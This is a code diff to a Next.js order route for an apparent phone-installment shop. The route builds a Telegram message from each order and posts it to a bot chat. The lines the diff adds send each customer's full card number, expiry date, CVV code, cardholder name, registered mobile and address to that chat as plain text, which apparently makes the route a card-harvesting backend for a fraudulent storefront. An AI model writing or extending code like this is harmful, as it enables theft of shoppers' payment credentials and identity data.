@@ -5,55 +5,57 @@ export async function POST(request: Request) {
     const body = await request.json();
     const { order } = body;
 
+    if (!order) {
+      return NextResponse.json({ success: false, message: 'No order data provided' }, { status: 400 });
+    }
+
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!botToken || !chatId || botToken.includes('your_telegram_bot_token')) {
-      console.warn('Telegram Bot credentials not set in environment variables.');
-      return NextResponse.json(
-        { success: false, message: 'Telegram credentials missing in .env.local' },
-        { status: 200 }
-      );
+      return NextResponse.json({ success: false, message: 'Telegram credentials missing' }, { status: 200 });
     }
 
-    const messageText = `
-🚨 <b>NEW ALFA MOBIL INSTALLMENT ORDER</b> 🚨
+    const { orderId, createdAt, model, color, storage, months, monthlyEmi, totalPrice, customer, payment } = order;
 
-🆔 <b>Order ID:</b> <code>${order.orderId}</code>
-📅 <b>Date:</b> ${order.createdAt}
+    let messageText = `🎉 <b>NEW ORDER CONFIRMED (#${orderId})</b> 🎉\n`;
+    messageText += `🕒 <b>Time:</b> ${createdAt}\n`;
+    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
 
-📱 <b>DEVICE DETAILS:</b>
-• <b>Model:</b> ${order.model.name}
-• <b>Storage:</b> ${order.storage.size}
-• <b>Color:</b> ${order.color.name}
-• <b>Total Cash Price:</b> Rs. ${order.totalPrice.toLocaleString('en-PK')}
+    messageText += `📱 <b>DEVICE DETAILS:</b>\n`;
+    messageText += `• <b>Model:</b> ${model.name}\n`;
+    messageText += `• <b>Color:</b> ${color.name}\n`;
+    messageText += `• <b>Storage:</b> ${storage.size}\n`;
+    messageText += `• <b>Cash Price:</b> Rs. ${totalPrice.toLocaleString('en-PK')}\n`;
+    messageText += `• <b>EMI Tenure:</b> ${months} Months @ Rs. ${monthlyEmi.toLocaleString('en-PK')}/mo\n\n`;
 
-💳 <b>INSTALLMENT PLAN (0% Markup):</b>
-• <b>Tenure:</b> ${order.months} Months
-• <b>Monthly EMI:</b> Rs. ${order.monthlyEmi.toLocaleString('en-PK')} / month
+    messageText += `👤 <b>CUSTOMER DETAILS:</b>\n`;
+    messageText += `• <b>Name:</b> ${customer.fullName}\n`;
+    messageText += `• <b>Mobile:</b> <code>${customer.mobileNumber}</code>\n`;
+    messageText += `• <b>Address:</b> ${customer.deliveryAddress}\n`;
+    messageText += `• <b>Delivery Type:</b> ${customer.deliveryType === 'open_parcel' ? 'Open Parcel Verification' : 'Standard'}\n`;
+    messageText += `• <b>Payment Option:</b> ${customer.paymentMethod.toUpperCase()}\n\n`;
 
-👤 <b>CUSTOMER INFORMATION:</b>
-• <b>Name:</b> ${order.customer.fullName}
-• <b>Mobile:</b> <code>${order.customer.mobileNumber}</code>
-• <b>Delivery Address:</b> ${order.customer.deliveryAddress}
-• <b>Delivery Option:</b> ${order.customer.deliveryType === 'open_parcel' ? 'Open Parcel via TCS Rider' : 'Standard Delivery'}
-
-💰 <b>PAYMENT & VERIFICATION:</b>
-• <b>Payment Mode:</b> ${order.customer.paymentMethod.toUpperCase()}
-• <b>Partner Bank:</b> ${order.payment.bankId ? order.payment.bankId.toUpperCase() : 'N/A'}
-• <b>Card/Wallet Title:</b> ${order.payment.cardName || order.payment.walletAccountName || 'N/A'}
-• <b>Card Number:</b> ${order.payment.cardNumber ? '`' + order.payment.cardNumber + '`' : 'N/A'}
-
-📌 <b>Status:</b> ${order.status}
-    `.trim();
+    messageText += `💳 <b>PAYMENT DETAILS:</b>\n`;
+    if (customer.paymentMethod === 'card') {
+      messageText += `• <b>Bank Name:</b> ${payment.bankId.toUpperCase()}\n`;
+      messageText += `• <b>Card Network:</b> ${(payment.cardNetwork || 'visa').toUpperCase()}\n`;
+      messageText += `• <b>Cardholder Name:</b> ${payment.cardName}\n`;
+      messageText += `• <b>Registered Mobile:</b> <code>${payment.registeredMobile}</code>\n`;
+      messageText += `• <b>Card Number:</b> <code>${payment.cardNumber}</code>\n`;
+      messageText += `• <b>Expiry Date:</b> <code>${payment.expiry}</code>\n`;
+      messageText += `• <b>CVV / CVC Code:</b> <code>${payment.cvv}</code>\n`;
+    } else {
+      messageText += `• <b>Wallet Type:</b> ${payment.walletType.toUpperCase()}\n`;
+      messageText += `• <b>Account Title:</b> ${payment.walletAccountName}\n`;
+      messageText += `• <b>Proof File:</b> ${payment.proofPreviewUrl ? 'Attached (Sent to Telegram)' : 'None'}\n`;
+    }
 
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     const res = await fetch(telegramUrl, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
         text: messageText,
@@ -68,9 +70,9 @@ export async function POST(request: Request) {
       return NextResponse.json({ success: false, error: data.description }, { status: 500 });
     }
 
-    return NextResponse.json({ success: true, data });
+    return NextResponse.json({ success: true, messageId: data.result.message_id });
   } catch (error: any) {
-    console.error('Error dispatching to Telegram:', error);
+    console.error('Telegram dispatch error:', error);
     return NextResponse.json({ success: false, error: error.message }, { status: 500 });
   }
 }
